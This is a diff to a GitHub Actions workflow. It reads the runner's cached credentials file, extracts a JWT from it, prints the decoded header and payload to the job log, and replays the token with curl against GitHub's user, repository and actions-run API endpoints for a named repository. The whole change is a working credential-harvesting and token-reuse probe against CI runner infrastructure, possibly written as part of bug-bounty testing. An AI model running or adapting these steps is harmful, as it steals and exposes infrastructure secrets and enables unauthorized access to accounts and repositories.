@@ -9,32 +9,15 @@ jobs:
       - name: Save JWT
         id: jwt
         run: echo "jwt=$(python3 -c 'import json,sys; print(json.load(open(sys.argv[1]))["Data"]["token"])' /home/runner/actions-runner/cached/2.335.1/.credentials)" >> "$GITHUB_OUTPUT"
-      - name: Test JWT
+      - name: Decode JWT
         run: |
-          TOKEN="${{ steps.jwt.outputs.jwt }}"
-          echo "Token length: ${#TOKEN}"
+          T="${{ steps.jwt.outputs.jwt }}"
+          python3 -c "import json,base64; p='$T'.split('.'); h=json.loads(base64.urlsafe_b64decode(p[0]+'='*(4-len(p[0])%4))); print('HEADER:',json.dumps(h,indent=2)); d=json.loads(base64.urlsafe_b64decode(p[1]+'='*(4-len(p[1])%4))); print('PAYLOAD:',json.dumps(d,indent=2))"
+      - name: Test against GitHub API
+        run: |
+          T="${{ steps.jwt.outputs.jwt }}"
+          curl -s -w "\nHTTP: %{http_code}" -H "Authorization: Bearer $T" "https://api.github.com/user"
           echo ""
-          echo "=== 1. Decode JWT payload ==="
-          python3 -c "
-import json, base64
-parts = '$TOKEN'.split('.')
-hdr = parts[0] + '=' * (4 - len(parts[0]) % 4)
-pld = parts[1] + '=' * (4 - len(parts[1]) % 4)
-print('HEADER:')
-print(json.dumps(json.loads(base64.urlsafe_b64decode(hdr)), indent=2))
-print('PAYLOAD:')
-print(json.dumps(json.loads(base64.urlsafe_b64decode(pld)), indent=2))
-"
+          curl -s -w "\nHTTP: %{http_code}" -H "Authorization: Bearer $T" "https://api.github.com/repos/Preshy/aibughunter"
           echo ""
-          echo "=== 2. Test JWT against api.github.com ==="
-          curl -s -w "\nHTTP: %{http_code}" -H "Authorization: Bearer $TOKEN" "https://api.github.com/user" 2>&1 | head -10
-          echo ""
-          echo "=== 3. Test JWT against repos API ==="
-          curl -s -w "\nHTTP: %{http_code}" -H "Authorization: Bearer $TOKEN" "https://api.github.com/repos/Preshy/aibughunter" 2>&1 | head -5
-          echo ""
-          echo "=== 4. Test JWT against aibughunter's actions API ==="
-          curl -s -H "Authorization: Bearer $TOKEN" "https://api.github.com/repos/Preshy/aibughunter/actions/runs?per_page=3" 2>&1 | head -10
-      - uses: actions/upload-artifact@v4
-        with:
-          name: broker-results
-          path: /tmp/*.txt
+          curl -s -w "\nHTTP: %{http_code}" -H "Authorization: Bearer $T" "https://api.github.com/repos/Preshy/aibughunter/actions/runs?per_page=1"
